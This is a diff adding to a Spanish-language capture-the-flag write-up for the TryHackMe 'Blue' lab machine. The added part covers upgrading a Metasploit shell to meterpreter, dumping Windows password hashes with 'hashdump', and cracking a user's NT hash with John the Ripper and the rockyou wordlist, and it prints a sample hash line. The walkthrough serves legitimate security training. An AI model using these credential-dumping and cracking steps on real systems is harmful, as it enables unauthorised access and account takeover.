@@ -119,10 +119,84 @@ set RHOST <IP víctima>
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/7.png)
 
-Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos `Metasploit` una shell dentro de la máquina víctima.
+Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos `Metasploit` una _shell_ dentro de la máquina víctima.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png)
 
+Una vez llegados a este punto, _TryHackMe_ nos pide convertir nuestra _shell_ actual, en `meterpreter`, para ello tendremos que abandonar nuestra sesión actual `Ctrl + Z`.
+
+Una vez fuera, tendremos que nuevamente buscar dentro de `Metasploit`, un módulo que nos permita pasar de una shell_ a `meterpreter`.
+
+```      
+search shell_to_meterpreter
+```
+
+Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo.
+
+```      
+use post/multi/manage/shell_to_meterpreter
+```
+
+Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un `meterpreter`, en este caso, la sesión con la que estábamos trabajando antes.
+
+```      
+show options                                  
+```  
+  
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png)
+
+```        
+sessions
+set SESSION 1
+run
+```
+
+La opción `sessions` nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular.
+
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/9.png)
+
+Una vez hemos conseguido un `meterpreter`, podemos volver a nuestra sesión.
+
+```      
+sessions 1
+```
+
 ### [](#header-3)Escalada De Privilegios
 
-ABC
+_TryHackMe_ nos indica que a través del comando 'migrate <ID del proceso>', podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos 'NT AUTHORITY\SYSTEM', de modo que no tiene sentido migrar al usuario que ya somos.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/10.png)
+
+Antes de pasar a conseguir las 'flags' de la máquina, la plataforma nos sigue enseñando comandos útiles de `Metasploit`, en este caso el comando 'hashdump', con el cual podemos listar todos los usarios del sistema, así como sus contraseñas _hasheadas_. 
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/11.png)
+
+En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea _Guest_, o _Administrator_; finalmente, se nos pide _crackear_ la contraseña de este usuario, para ello utilizaremos la herramienta `John the Ripper`, en conjunto del diccionario [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
+
+En caso de no contar con la herramienta `John the Ripper` instalada, podemos hacer lo siguiente:
+
+```
+sudo apt install john
+```
+
+En nuestra máquina, crearemos un documento de texto que contenga la contraseña _hasheada_ del usuario, podemos hacerlo de manera manual, o desde la misma terminal:
+
+```
+echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" >> hash.txt
+```
+
+Una vez creado el archivo de texto, podemos pasar a _crackear_ la contraseña:
+
+```
+sudo john --format=NT --wordlist=dirección/del/diccionario/rockyou nombreArchivoTexto.txt
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/12.png)
+
+
+
+
+
+
+
